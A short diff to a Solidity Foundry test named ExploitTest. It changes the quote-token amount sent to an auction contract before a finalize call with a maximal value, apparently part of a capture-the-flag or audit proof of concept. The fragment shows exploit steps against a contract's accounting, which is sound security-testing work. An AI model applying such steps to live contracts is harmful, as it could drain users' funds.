@@ -107,7 +107,7 @@ contract ExploitTest is Test {
             baseToken.balanceOf(address(auction))
         );
         baseToken.transfer(address(auction), baseToken.balanceOf(player));
-        quoteToken.transfer(address(auction), 7331547510229267370 - 1e10);
+        quoteToken.transfer(address(auction), amountQuote * 2 - 1e10);
         auction.finalize(aid, indices, amountBase, type(uint128).max);
         console.log(
             "Final auction's quote token amount:",
